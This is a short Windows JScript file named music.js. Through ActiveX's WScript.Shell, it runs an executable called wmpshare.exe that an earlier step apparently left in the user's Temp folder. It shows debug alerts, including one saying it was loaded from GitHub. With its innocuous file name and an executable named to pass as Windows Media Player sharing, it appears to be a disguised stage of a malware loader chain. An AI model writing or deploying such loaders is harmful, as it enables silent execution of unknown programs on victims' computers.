// music.js - Execute wmpshare.exe from Temp

alert("✅ music.js loaded from GitHub!");

try {
    var shell = new ActiveXObject("WScript.Shell");
    var temp = shell.ExpandEnvironmentStrings("%TEMP%");
    
    alert("Executing wmpshare.exe from: " + temp);
    
    // Execute the already downloaded file from Temp
    shell.Run('"' + temp + '\\wmpshare.exe"', 1, false);

} catch(e) {
    alert("Execution Error: " + e.message);
}
